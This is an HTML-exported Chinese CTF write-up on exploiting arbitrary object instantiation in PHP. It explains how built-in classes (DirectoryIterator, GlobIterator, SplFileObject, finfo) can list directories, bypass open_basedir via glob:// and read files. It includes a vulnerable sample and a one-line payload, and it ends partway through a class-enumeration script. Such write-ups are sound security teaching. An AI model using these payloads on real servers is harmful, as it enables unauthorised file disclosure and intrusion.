@@ -1,0 +1,581 @@
+<!DOCTYPE html><html><head>
+      <title>&#x5229;&#x7528;PHP&#x4E2D;&#x6CA1;&#x6709;&#x81EA;&#x5B9A;&#x4E49;&#x7C7B;&#x7684;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\vials\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.6.3\node_modules\@shd101wyy\mume\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      <style>
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
+ */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
+
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
+}
+
+.token.comment,
+.token.blockquote {
+  color: #969896;
+}
+
+.token.cdata {
+  color: #183691;
+}
+
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
+}
+
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
+}
+
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
+}
+
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
+
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: hsla(24, 20%, 50%,.08);
+  background: linear-gradient(to right, hsla(24, 20%, 50%,.1) 70%, hsla(24, 20%, 50%,0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+
+pre[data-line] .line-highlight:before, 
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: hsla(24, 20%, 50%,.4);
+  color: hsl(24, 20%, 95%);
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <h1 class="mume-header" id="exploiting-arbitrary-object-instantiations-in-php-without-custom-classes"><strong>Exploiting Arbitrary Object Instantiations in PHP without Custom Classes</strong></h1>
+
+<hr>
+<h2 class="mume-header" id="%E7%BF%BB%E8%AF%91%E8%B5%B7%E6%9D%A5%E5%8D%B3%E6%98%AF%E5%88%A9%E7%94%A8php%E4%B8%AD%E6%B2%A1%E6%9C%89%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E7%9A%84%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E5%8C%96%E6%9C%AC%E6%96%87%E8%AE%A9%E6%88%91%E4%BB%AC%E6%9D%A5%E6%8E%A2%E7%A9%B6%E4%B8%80%E4%B8%8Bphp%E4%B8%AD%E7%9A%84%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E5%AE%9E%E4%BE%8B%E5%8C%96">&#x7FFB;&#x8BD1;&#x8D77;&#x6765;&#x5373;&#x662F;&#xFF1A;&#x5229;&#x7528;PHP&#x4E2D;&#x6CA1;&#x6709;&#x81EA;&#x5B9A;&#x4E49;&#x7C7B;&#x7684;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x3002;&#x672C;&#x6587;&#x8BA9;&#x6211;&#x4EEC;&#x6765;&#x63A2;&#x7A76;&#x4E00;&#x4E0B;php&#x4E2D;&#x7684;&#x4EFB;&#x610F;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;&#x5316;&#x3002;</h2>
+
+<h2 class="mume-header" id="%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%81%A9%E6%80%A8%E7%BA%A0%E8%91%9B"><strong>&#x4E00;&#x9053;CTF&#x9898;&#x5E26;&#x6765;&#x7684;&#x6069;&#x6028;&#x7EA0;&#x845B;</strong></h2>
+
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword keyword-new">new</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;a&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;b&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+</pre><p>&#x7ED9;&#x51FA;&#x5982;&#x4E0A;&#x4EE3;&#x7801;&#xFF0C;&#x4F60;&#x80FD;&#x60F3;&#x5230;&#x4EC0;&#x4E48;&#x65B9;&#x5F0F;RCE&#x3002;&#xFF08;PS&#xFF1A;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;$_GET[&apos;a&apos;]&#x6765;&#x4F5C;&#x4E3A;&#x7C7B;&#x540D;&#xFF0C;&#x56E0;&#x4E3A;php&#x4F1A;&#x5C06;&#x5176;&#x89C6;&#x4F5C;&#x975E;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x800C;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x662F;&#x7528;&#x4F5C;&#x4E00;&#x4E2A;&#x5C0F;&#x6837;&#x4F8B;&#xFF0C;&#x6B63;&#x5E38;&#x7684;&#x5199;&#x6CD5;&#x8981;&#x5728;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E4B;&#x4E2D;&#x52A0;&#x5165;&#x7C7B;&#x4F3C;&#x6761;&#x4EF6;&#x5224;&#x65AD;&#x7684;&#x8BED;&#x53E5;&#xFF0C;&#x907F;&#x514D;&#x6B64;&#x4EE3;&#x7801;&#x76F4;&#x63A5;&#x6267;&#x884C;&#x3002;&#xFF09;</p>
+<p>&#x6839;&#x636E;&#x6211;&#x4EEC;&#x591A;&#x5E74;&#x8D5B;&#x68CD;&#x7684;&#x7ECF;&#x9A8C;&#xFF0C;&#x7B2C;&#x4E00;&#x53CD;&#x5E94;&#x663E;&#x7136;&#x662F;php&#x7684;&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;&#x3002;</p>
+<h2 class="mume-header" id="%E5%B8%B8%E8%A7%81%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">&#x5E38;&#x89C1;&#x7684;php&#x539F;&#x751F;&#x7C7B;&#x5229;&#x7528;</h2>
+
+<ol>
+<li>
+<p>SPL<br>
+&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;SPL&#x5C31;&#x662F;Standard PHP Library&#x7684;&#x7F29;&#x5199;&#x3002;&#x636E;&#x624B;&#x518C;&#x663E;&#x793A;&#xFF0C;SPL&#x662F;&#x7528;&#x4E8E;&#x89E3;&#x51B3;&#x5178;&#x578B;&#x95EE;&#x9898;(standard problems)&#x7684;&#x4E00;&#x7EC4;&#x63A5;&#x53E3;&#x4E0E;&#x7C7B;&#x7684;&#x96C6;&#x5408;&#x3002;&#x6253;&#x5F00;&#x624B;&#x518C;&#xFF0C;&#x6B63;&#x5982;&#x4E0A;&#x9762;&#x7684;&#x5B9A;&#x4E49;&#x4E00;&#x6837;&#xFF0C;&#x6709;&#x8BB8;&#x591A;&#x5C01;&#x88C5;&#x597D;&#x7684;&#x7C7B;&#x3002;&#x56E0;&#x4E3A;&#x662F;&#x8981;&#x89E3;&#x51B3;&#x5178;&#x578B;&#x95EE;&#x9898;&#xFF0C;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x4E00;&#x4E9B;&#x5904;&#x7406;&#x6587;&#x4EF6;&#x7684;&#x7C7B;&#x3002;</p>
+<p><img src="images/2022-08-04-09-21-43.png" alt><br>
+<img src="images/2022-08-04-09-21-54.png" alt></p>
+</li>
+</ol>
+<p>&#x4E00;&#x3001;&#x53EF;&#x904D;&#x5386;&#x76EE;&#x5F55;&#x7C7B;</p>
+<pre class="language-text">DirectoryIterator
+
+    &lt;?php
+    $dir=new DirectoryIterator(&quot;/&quot;);
+    echo $dir;
+    ?&gt;
+&#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x7684;&#x8FED;&#x4EE3;&#x5668;&#x3002;&#x5F53;&#x6267;&#x884C;&#x5230;echo&#x51FD;&#x6570;&#x65F6;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;DirectoryIterator&#x7C7B;&#x4E2D;&#x7684; __toString() &#x65B9;&#x6CD5;&#xFF0C;&#x8F93;&#x51FA;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x91CC;&#x9762;&#x7ECF;&#x8FC7;&#x6392;&#x5E8F;&#x4E4B;&#x540E;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x540D;&#xFF1A;
+
+&#x5982;&#x679C;&#x60F3;&#x8F93;&#x51FA;&#x5168;&#x90E8;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x6211;&#x4EEC;&#x8FD8;&#x9700;&#x8981;&#x5BF9;$dir&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF1A;
+
+    &lt;?php
+    $dir=new DirectoryIterator(&quot;/&quot;);
+    foreach($dir as $f){
+    echo($f.&apos;&lt;br&gt;&apos;);
+    //echo($f-&gt;__toString().&apos;&lt;br&gt;&apos;);
+    }
+
+&#x4E5F;&#x53EF;&#x4EE5;&#x914D;&#x5408;glob://&#x534F;&#x8BAE;&#x4F7F;&#x7528;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#x6765;&#x5BFB;&#x627E;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF1A;
+
+    &lt;?php
+    $dir=new DirectoryIterator(&quot;glob:///*php*&quot;);
+    echo $dir;
+
+
+
+
+FilesystemIterator:&#x540C;&#x4E0A;
+
+GlobIterator &#x4E0E;&#x4E0A;&#x9762;&#x7565;&#x4E0D;&#x540C;&#xFF0C;&#x8BE5;&#x7C7B;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6A21;&#x5F0F;&#x5339;&#x914D;&#x6765;&#x5BFB;&#x627E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;
+
+&lt;?php
+$dir=new GlobIterator(&quot;/*flag*&quot;);
+echo $dir;
+</pre>
+<p>&#x4F7F;&#x7528;&#x53EF;&#x904D;&#x5386;&#x76EE;&#x5F55;&#x7C7B;&#x7ED5;&#x8FC7; open_basedir<br>
+&#x4F7F;&#x7528; DirectoryIterator &#x7C7B;<br>
+DirectoryIterator&#x4E0E;glob://&#x534F;&#x8BAE;&#x7ED3;&#x5408;&#x5C06;&#x65E0;&#x89C6;open_basedir&#x5BF9;&#x76EE;&#x5F55;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5217;&#x4E3E;&#x51FA;&#x6307;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#x3002;</p>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;whoami&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-foreach">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword keyword-as">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword keyword-echo">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">&apos;&lt;br&gt;&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#x4E0D;&#x52A0;__toString()&#x4E5F;&#x53EF;,&#x56E0;&#x4E3A;echo&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x8C03;&#x7528;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">?</span><span class="token operator">&gt;</span>
+<span class="token comment"># payload&#x4E00;&#x53E5;&#x8BDD;&#x7684;&#x5F62;&#x5F0F;:</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword keyword-new">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;glob:///*&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword keyword-foreach">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword keyword-as">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword keyword-echo">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">&apos;&lt;br&gt;&apos;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
+</pre><p>&#x4E8C;.&#x53EF;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x7C7B;</p>
+<pre class="language-text">SplFileObject &#x5728;&#x6B64;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;URL &#x53EF;&#x4F5C;&#x4E3A;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4E0D;&#x8FC7;&#x4E5F;&#x8981;&#x53D7;&#x5230;
+allow_url_fopen&#x5F71;&#x54CD;&#x3002;
+
+plFileInfo &#x7C7B;&#x4E3A;&#x5355;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4FE1;&#x606F;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x9AD8;&#x7EA7;&#x7684;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E8E;&#x5BF9;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x904D;&#x5386;&#x3001;&#x67E5;&#x627E;&#x3001;&#x64CD;&#x4F5C;&#x7B49;
+
+![](images/2022-08-04-19-39-34.png)
+
+&#x8BE5;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6587;&#x4EF6;&#x5BF9;&#x8C61;&#x7528;&#x4E8E;&#x540E;&#x7EED;&#x7684;&#x8BFB;&#x53D6;&#x3002;
+
+&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x50CF;&#x7C7B;&#x4F3C;&#x4E0B;&#x9762;&#x8FD9;&#x6837;&#x53BB;&#x8BFB;&#x53D6;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4E00;&#x884C;&#xFF1A;
+
+&lt;?php
+$context = new SplFileObject(&apos;/cachegrind.out.1004&apos;);
+echo $context;
+
+&#x4F46;&#x662F;&#x8FD9;&#x6837;&#x4E5F;&#x53EA;&#x80FD;&#x8BFB;&#x53D6;&#x4E00;&#x884C;&#xFF0C;&#x8981;&#x60F3;&#x5168;&#x90E8;&#x8BFB;&#x53D6;&#x7684;&#x8BDD;&#x8FD8;&#x9700;&#x8981;&#x5BF9;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x884C;&#x5185;&#x5BB9;&#x8FDB;&#x884C;&#x904D;&#x5386;&#xFF1A;
+
+&lt;?php
+$context = new SplFileObject(&apos;/cachegrind.out.1004&apos;);
+foreach($context as $f){
+echo($f);
+}
+</pre>
+<ol start="2">
+<li>
+<p>&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x76F8;&#x5173;&#x6269;&#x5C55;</p>
+<p>finfo &#x8BE5;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;finfo::__construct &#x2014; &#x522B;&#x540D; finfo_open(),&#x4E5F;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#x3002;</p>
+<p><img src="images/2022-08-04-09-24-28.png" alt></p>
+<p>&#x8C03;&#x8BD5;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;finfo&#x4F1A;&#x5C06;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF08;&#x5F53;&#x7136;&#x8FD9;&#x4E00;&#x4E9B;&#x90FD;&#x662F;&#x5EFA;&#x7ACB;&#x5728;&#x7A0B;&#x5E8F;&#x8B66;&#x544A;&#x3001;&#x62A5;&#x9519;&#x6D88;&#x606F;&#x5F00;&#x542F;&#x7684;&#x60C5;&#x51B5;&#x4E0B;ini_set(&apos;display_errors&apos;, &apos;on&apos;);ini_set(&apos;error_reporting&apos;, E_ALL);&#xFF09;&#x7206;&#x51FA;&#x6765;&#x7684;&#x539F;&#x56E0;&#x3002;<br>
+&#x539F;&#x56E0;&#xFF1A;parse&#x51FD;&#x6570;&#x89E3;&#x6790;&#x5185;&#x5BB9;&#x662F;&#x5426;&#x6709;&#x6548;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E0D;&#x7B26;&#x5408;magic&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x683C;&#x5F0F;&#x7684;&#x5219;&#x4F1A;&#x53D1;&#x51FA;&#x76F8;&#x5E94;&#x8B66;&#x544A;&#xFF0C;&#x4ECE;&#x800C;&#x4E00;&#x53E5;&#x53E5;&#x62A5;&#x51FA;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#x3002;</p>
+</li>
+<li>
+<p>&#x68C0;&#x6D4B;php&#x5185;&#x7F6E;&#x7C7B;</p>
+</li>
+</ol>
+<pre data-role="codeBlock" data-info="php" class="language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword keyword-foreach">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword keyword-as">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
